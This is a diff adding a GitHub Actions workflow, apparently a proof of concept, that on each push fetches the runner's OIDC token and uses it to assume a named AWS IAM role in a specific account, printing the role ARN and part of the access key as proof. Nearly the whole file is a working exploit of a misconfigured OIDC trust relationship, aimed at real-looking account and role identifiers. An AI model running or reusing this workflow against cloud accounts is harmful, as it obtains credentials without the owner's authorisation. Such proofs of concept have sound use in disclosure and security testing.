@@ -1,0 +1,32 @@
+name: PoC - OIDC AWS Role Assumption
+on: [push]
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Capture OIDC token and assume AWS role
+        run: |
+          echo "=== OIDC TOKEN REQUEST ==="
+          TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+          echo "OIDC Token obtained: ${TOKEN:0:50}..."
+          
+          echo "=== AWS STS ASSUME ROLE ==="
+          aws sts assume-role-with-web-identity \
+            --role-arn arn:aws:iam::479305788615:role/federated-ecr-readonly \
+            --role-session-name poc-proof \
+            --web-identity-token "$TOKEN" \
+            --region us-east-2 \
+            --output json | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+creds=d.get('AssumedRoleUser',{})
+print('AssumedRoleArn:', creds.get('Arn',''))
+print('AssumedRoleId:', creds.get('AssumedRoleId',''))
+c=d.get('Credentials',{})
+print('AccessKeyId:', c.get('AccessKeyId','')[:20]+'...')
+print('Expiration:', c.get('Expiration',''))
+"
